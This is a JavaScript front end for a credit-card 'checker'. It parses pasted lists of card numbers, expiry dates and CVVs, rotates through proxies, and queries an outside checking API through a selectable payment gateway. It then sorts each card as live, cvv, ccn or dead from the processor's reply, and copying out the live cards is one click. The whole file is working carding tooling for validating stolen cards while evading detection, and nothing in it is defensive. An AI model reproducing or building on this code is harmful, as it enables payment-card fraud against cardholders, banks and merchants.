$(document).ready(function() {
    // Set current year for copyright
    $('#currentYear').text(new Date().getFullYear());

    // Dark mode toggle
    const toggleSwitch = document.querySelector('#checkbox');
    function switchTheme(e) {
        if (e.target.checked) {
            document.body.classList.add('dark-mode');
            document.documentElement.setAttribute('data-bs-theme', 'dark');
        } else {
            document.body.classList.remove('dark-mode');
            document.documentElement.removeAttribute('data-bs-theme');
        }
    }
    toggleSwitch.addEventListener('change', switchTheme, false);

    let isChecking = false;
    let checkQueue = [];
    let currentProxyIndex = 0;
    let proxies = [];
    let totalCC = 0;
    let checkedCC = 0;
    let liveResults = [];
    let cvvResults = [];
    let ccnResults = [];
    let dieResults = [];
    let errorResults = [];

    // Update status info
    function updateStatus(message) {
        $('#statusInfo').html('<i class="bi bi-info-circle me-2"></i>Status: ' + message);
    }

    // Update result counts
    function updateResultCounts() {
        $('#liveCount').text(liveResults.length);
        $('#cvvCount').text(cvvResults.length);
        $('#ccnCount').text(ccnResults.length);
        $('#dieCount').text(dieResults.length);
        $('#errorCount').text(errorResults.length);
    }

    // Format CC list
    function formatCCLists(ccText) {
        const lines = ccText.split('\n').filter(line => line.trim() !== '');
        return lines.map(line => {
            // Clean up the line
            let cleanLine = line.trim().replace(/\s+/g, '');
            
            // Handle different separators: |, :, or /
            if (cleanLine.includes('|')) {
                return cleanLine;
            } else if (cleanLine.includes(':')) {
                return cleanLine.replace(/:/g, '|');
            } else if (cleanLine.includes('/')) {
                const parts = cleanLine.split('/');
                if (parts.length >= 3) {
                    return `${parts[0]}|${parts[1]}|${parts[2]}|${parts[3] || ''}`;
                }
            }
            return cleanLine;
        }).filter(cc => {
            // Basic validation - check if it has at least 3 parts
            const parts = cc.split('|');
            return parts.length >= 3 && parts[0].length >= 15;
        });
    }

    // Get next proxy in rotation
    function getNextProxy() {
        if (proxies.length === 0) return null;
        const proxy = proxies[currentProxyIndex];
        currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
        return proxy;
    }

    // Update progress bar
    function updateProgress() {
        const percentage = totalCC > 0 ? (checkedCC / totalCC) * 100 : 0;
        $('.progress-bar').css('width', `${percentage}%`).attr('aria-valuenow', percentage);
        $('.progress-text').text(`${checkedCC}/${totalCC}`);
    }

    // Add result to the appropriate section
    function addResult(type, data, response) {
        let resultItem = '';
        
        if (type === 'error') {
            resultItem = `
                <div class="result-item error-item">
                    <strong>CC:</strong> ${data.cc}<br>
                    <strong>Error:</strong> ${response}
                </div>
            `;
            errorResults.push(resultItem);
            $('#errorResults').append(resultItem);
            updateResultCounts();
            return;
        }
        
        const msg = response.data.info.msg || 'No message';
        resultItem = `
            <div class="result-item ${type}-item">
                <strong>CC:</strong> ${data.cc} | ${data.month}/${data.year} | ${data.cvv}<br>
                <strong>Status:</strong> ${msg}<br>
                <strong>Bank:</strong> ${response.data.info.bank_name || 'N/A'} (${response.data.info.country || 'N/A'})<br>
                <strong>Type:</strong> ${response.data.info.type || 'N/A'} - ${response.data.info.scheme || 'N/A'}
            </div>
        `;

        switch (type) {
            case 'live':
                liveResults.push(resultItem);
                $('#liveResults').append(resultItem);
                break;
            case 'cvv':
                cvvResults.push(resultItem);
                $('#cvvResults').append(resultItem);
                break;
            case 'ccn':
                ccnResults.push(resultItem);
                $('#ccnResults').append(resultItem);
                break;
            case 'die':
                dieResults.push(resultItem);
                $('#dieResults').append(resultItem);
                break;
        }
        
        updateResultCounts();
    }

    // Check a single CC
    function checkCC(ccData) {
        return new Promise((resolve) => {
            if (!isChecking) return resolve();

            const proxy = getNextProxy();
            if (!proxy) {
                updateStatus("No proxy available");
                errorResults.push(`No proxy available for ${ccData}`);
                updateResultCounts();
                return resolve();
            }

            const [cc, month, year, cvv] = ccData.split('|');
            const apiKey = $('#apikey').val().trim();
            const proxyAuth = $('#proxyAuth').val().trim();
            const proxyType = $('#proxyType').val();
            const gateway = $('#gateway').val();

            // Validate API key
            if (!apiKey) {
                updateStatus("API Key is required");
                errorResults.push(`API Key is required for ${ccData}`);
                checkedCC++;
                updateProgress();
                updateResultCounts();
                return resolve();
            }

            // Encode parameters for URL
            const encodedCC = encodeURIComponent(ccData);
            const encodedProxy = encodeURIComponent(proxy);
            const encodedProxyAuth = encodeURIComponent(proxyAuth);
            
            let apiUrl = `https://api.darkxcode.site/checker/cc-checkerV4.5/?cc=${encodedCC}&apikey=${apiKey}&proxy=${encodedProxy}&type_proxy=${proxyType}&gate=${gateway}`;

            if (proxyAuth) {
                apiUrl += `&proxyPWD=${encodedProxyAuth}`;
            }

            updateStatus(`Checking: ${cc}...`);

            $.ajax({
                url: apiUrl,
                method: 'GET',
                timeout: 30000,
                success: function(response) {
                    checkedCC++;
                    updateProgress();

                    if (response && response.data) {
                        if (response.data.code === 200) {
                            const msg = response.data.info.msg.toLowerCase();
                            
                            if (msg.includes('approved') || msg.includes('success') || 
                                msg.includes('approv') || msg.includes('thank you') ||
                                msg.includes('cvc_check') || msg.includes('one-time') ||
                                msg.includes('succeeded') || msg.includes('authenticate successful') ||
                                msg.includes('authenticate attempt successful')) {
                                addResult('live', {cc, month, year, cvv}, response);
                            } else if (msg.includes('transaction_not_allowed') || 
                                       msg.includes('authentication_required') ||
                                       msg.includes('Your card zip code is incorrect.') || 
                                       msg.includes('card_error_authentication_required') ||
                                       msg.includes('three_d_secure_redirect')) {
                                addResult('cvv', {cc, month, year, cvv}, response);
                            } else if (msg.includes('incorrect_cvc') || 
                                       msg.includes('invalid_cvc') ||
                                       msg.includes('insufficient_funds')) {
                                addResult('ccn', {cc, month, year, cvv}, response);
                            } else if (msg.includes('failed') || msg.includes('die') || msg.includes('invalid')) {
                                addResult('die', {cc, month, year, cvv}, response);
                            } else {
                                addResult('die', {cc, month, year, cvv}, response);
                            }
                        } else {
                            addResult('die', {cc, month, year, cvv}, response);
                        }
                    } else {
                        addResult('error', {cc}, "Invalid response from API");
                    }
                    resolve();
                },
                error: function(xhr, status, error) {
                    checkedCC++;
                    updateProgress();
                    
                    let errorMsg = "Unknown error";
                    if (xhr.responseJSON && xhr.responseJSON.message) {
                        errorMsg = xhr.responseJSON.message;
                    } else if (error) {
                        errorMsg = error;
                    } else if (status === 'timeout') {
                        errorMsg = "Request timeout";
                    }
                    
                    addResult('error', {cc}, `API Error: ${errorMsg}`);
                    resolve();
                }
            });
        });
    }

    // Process the queue
    async function processQueue() {
        const delay = parseInt($('#delay').val()) || 1000;
        
        for (const ccData of checkQueue) {
            if (!isChecking) break;
            
            await checkCC(ccData);
            
            // Add delay between requests
            if (delay > 0) {
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        isChecking = false;
        $('#checkBtn').prop('disabled', false);
        $('#stopBtn').prop('disabled', true);
        updateStatus("Checking completed");
    }

    // Start checking
    $('#checkerForm').on('submit', function(e) {
        e.preventDefault();
        
        if (isChecking) return;
        
        // Reset results
        liveResults = [];
        cvvResults = [];
        ccnResults = [];
        dieResults = [];
        errorResults = [];
        $('#liveResults').empty();
        $('#cvvResults').empty();
        $('#ccnResults').empty();
        $('#dieResults').empty();
        $('#errorResults').empty();
        updateResultCounts();
        
        // Get inputs
        const ccListsText = $('#ccLists').val().trim();
        const proxyText = $('#proxy').val().trim();
        const apiKey = $('#apikey').val().trim();
        
        if (!apiKey) {
            alert('API Key is required!');
            return;
        }
        
        if (!ccListsText) {
            alert('CC Lists is required!');
            return;
        }
        
        if (!proxyText) {
            alert('Proxy is required!');
            return;
        }
        
        // Format CC lists
        checkQueue = formatCCLists(ccListsText);
        totalCC = checkQueue.length;
        
        if (totalCC === 0) {
            alert('No valid CC found in the list!');
            return;
        }
        
        checkedCC = 0;
        updateProgress();
        
        // Format proxy lists
        proxies = proxyText.split('\n')
            .map(proxy => proxy.trim())
            .filter(proxy => {
                // Basic proxy validation
                const parts = proxy.split(':');
                return parts.length >= 2 && parts[0] && parts[1];
            });
        
        if (proxies.length === 0) {
            alert('No valid proxy found in the list! Format should be IP:PORT');
            return;
        }
        
        currentProxyIndex = 0;
        
        // Start processing
        isChecking = true;
        $('#checkBtn').prop('disabled', true);
        $('#stopBtn').prop('disabled', false);
        updateStatus("Checking started...");
        
        processQueue();
    });

    // Stop checking
    $('#stopBtn').on('click', function() {
        isChecking = false;
        $('#checkBtn').prop('disabled', false);
        $('#stopBtn').prop('disabled', true);
        updateStatus("Checking stopped by user");
    });

    // Copy results
    $('#copyLive').on('click', function() {
        const text = liveResults.map(item => $(item).text().replace(/\s+/g, ' ').trim()).join('\n');
        copyToClipboard(text);
    });

    $('#copyCVV').on('click', function() {
        const text = cvvResults.map(item => $(item).text().replace(/\s+/g, ' ').trim()).join('\n');
        copyToClipboard(text);
    });

    $('#copyCCN').on('click', function() {
        const text = ccnResults.map(item => $(item).text().replace(/\s+/g, ' ').trim()).join('\n');
        copyToClipboard(text);
    });

    // Delete die results
    $('#deleteDie').on('click', function() {
        dieResults = [];
        $('#dieResults').empty();
        updateResultCounts();
    });

    // Delete error results
    $('#deleteError').on('click', function() {
        errorResults = [];
        $('#errorResults').empty();
        updateResultCounts();
    });

    // Copy to clipboard function
    function copyToClipboard(text) {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        alert('Copied to clipboard!');
    }
});